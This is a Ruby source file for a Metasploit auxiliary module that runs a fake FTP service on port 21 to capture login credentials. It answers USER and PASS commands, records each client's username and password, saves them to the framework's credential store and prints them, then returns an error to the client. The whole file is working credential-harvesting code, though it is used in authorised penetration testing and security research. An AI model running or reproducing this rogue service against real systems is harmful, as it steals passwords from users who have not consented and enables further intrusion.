##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Authentication Capture: FTP',
      'Description'    => %q{
          This module provides a fake FTP service that
        is designed to capture authentication credentials.
      },
      'Author'      => ['ddz', 'hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 21 ])
      ])
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "220 FTP Server Ready\r\n"
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(c)
    data = c.get_once
    return if not data
    cmd,arg = data.strip.split(/\s+/, 2)
    arg ||= ""

    if(cmd.upcase == "USER")
      @state[c][:user] = arg
      c.put "331 User name okay, need password...\r\n"
      return
    end

    if(cmd.upcase == "QUIT")
      c.put "221 Logout\r\n"
      return
    end

    if(cmd.upcase == "PASS")
      @state[c][:pass] = arg

      report_cred(
        ip: @state[c][:ip],
        port: datastore['SRVPORT'],
        service_name: 'ftp',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: arg
      )

      print_good("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
    end

    @state[c][:pass] = data.strip
    c.put "500 Error\r\n"
    return

  end

  def on_client_close(c)
    @state.delete(c)
  end


end
